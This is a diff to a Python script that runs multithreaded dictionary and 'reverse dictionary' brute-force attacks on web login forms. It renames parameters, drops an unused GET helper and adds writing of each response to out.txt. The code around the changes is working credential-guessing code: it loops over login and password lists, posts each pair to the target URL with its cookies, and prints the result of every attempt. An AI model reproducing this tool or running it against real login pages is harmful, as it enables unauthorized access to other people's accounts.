@@ -21,23 +21,17 @@ import requests
 print_lock = threading.Lock()
 ### END PRINT LOCK ###
 
-
-def make_empty_get_request(url):
-	print('Making request to url...')
-	resp = requests.get(url)
-	print('Done.')
-	try:
-        	resp.raise_for_status()
-	except requests.exceptions.RequestException as e:
-		print("Error: {}".format(e))
-		return None
-	return resp
-
-def make_request(target, login, password):
-	target.request_body[target.login_var] = login
-	target.request_body[target.pass_var] = password
-	http_method = target.get_login_form_data()['Method'].upper()
-	response = requests.request(http_method, target.url, data = target.request_body, cookies = target.cookies)
+def make_request(pattern, login, password):
+	pattern.request_body[pattern.login_var] = login
+	pattern.request_body[pattern.pass_var] = password
+	response = requests.request(pattern.http_method, 
+				pattern.url, 
+				data = pattern.request_body,
+				cookies = pattern.cookies
+				)
+	fl = open('out.txt', 'w')
+	fl.write(response.text)
+	fl.close()
 	return response
 
 
@@ -54,7 +48,7 @@ def parse_response(response, unsuccess_sign):
 
 	
 
-def dict_attack(target, queue, password_list):
+def dict_attack(request_pattern, queue, password_list):
 	"""	
 	 Dictionary attack of target url based on
 	 default brute force (try all password for every login)
@@ -63,7 +57,7 @@ def dict_attack(target, queue, password_list):
 	while True:
 		login = queue.get()
 		for passwd in password_list:
-			response = make_request(target, login, passwd)
+			response = make_request(request_pattern, login, passwd)
 			with print_lock:
 				print('Trying ' 
 				     + login 
@@ -71,11 +65,12 @@ def dict_attack(target, queue, password_list):
 				     + passwd
 				     , end = ' '
 				     )
-				result = parse_response(response, target.unsuccess_sign)
+				result = parse_response(response, request_pattern.unsuccess_sign)
 				print(result)
 		queue.task_done()
 	
-def reverse_dict_attack(target, login_list, queue):
+
+def reverse_dict_attack(request_pattern, login_list, queue):
 	"""
 	 Reverse dict attack is based on reverse technique:
 	 try all logins for each password
@@ -84,7 +79,7 @@ def reverse_dict_attack(target, login_list, queue):
 	while True:
 		passwd = queue.get()
 		for login in login_list:
-			response = make_request(target, login, passwd)
+			response = make_request(request_pattern, login, passwd)
 			with print_lock:
 				print('Trying ' 
 				     + login 
@@ -92,16 +87,16 @@ def reverse_dict_attack(target, login_list, queue):
 				     + passwd
 				     , end = ' '
 				     )
-				result = parse_response(response, target.unsuccess_sign)
+				result = parse_response(response, request_pattern.unsuccess_sign)
 				print(result)
 		queue.task_done()
 
 
-def brute_force(target, logins, passwords, num_threads, reverse = False):		
+def brute_force(request_pattern, logins, passwords, num_threads, reverse = False):		
 	q = Queue()
 	if reverse == False:
 		for thread_counter in range(num_threads):
-			thrd = threading.Thread(target = dict_attack, args = (target, q, passwords))
+			thrd = threading.Thread(target = dict_attack, args = (request_pattern, q, passwords))
 			thrd.daemon = True
 			thrd.start()
 
@@ -109,11 +104,10 @@ def brute_force(target, logins, passwords, num_threads, reverse = False):
 			q.put(login)
 	else:
 		for thread_counter in range(num_threads):
-			thrd = threading.Thread(target = reverse_dict_attack, args = (target, logins, q))			
+			thrd = threading.Thread(target = reverse_dict_attack, args = (request_pattern, logins, q))			
 			thrd.daemon = True
 			thrd.start()
 
 		for passwd in passwords:
 			q.put(passwd)
 	q.join()
-
